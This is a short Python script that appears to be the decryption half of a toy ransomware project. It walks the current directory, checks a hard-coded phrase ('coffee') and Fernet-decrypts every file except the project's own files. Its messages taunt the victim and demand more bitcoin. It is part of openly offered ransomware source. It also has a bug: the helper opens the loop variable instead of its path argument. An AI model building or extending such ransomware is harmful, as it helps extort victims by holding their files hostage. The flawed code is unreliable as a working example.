
import os 
from cryptography.fernet import Fernet
# This file does the opposite of ENCRYPTING

def decrypt_file(file_path, key):
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_decrypted = Fernet(key).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)

# loading secret key
with open("thekey.key","rb") as key:
	key = key.read()

secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
# this loop will go through each file in the files list and DECRYPT each one with the key	
	for root, dirs, files in os.walk('.'):
		for file in files:
			# skipping files we dont want to decrypt
			if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key' or file == "dryrun.py" or file == "README.md":
				continue
			# getting file path
			file_path = os.path.join(root, file)
			# decryption
			decrypt_file(file_path, key)

	print("Thanks sucka")
else: 
	print("WRONG!, SEND MORE BITCOIN")
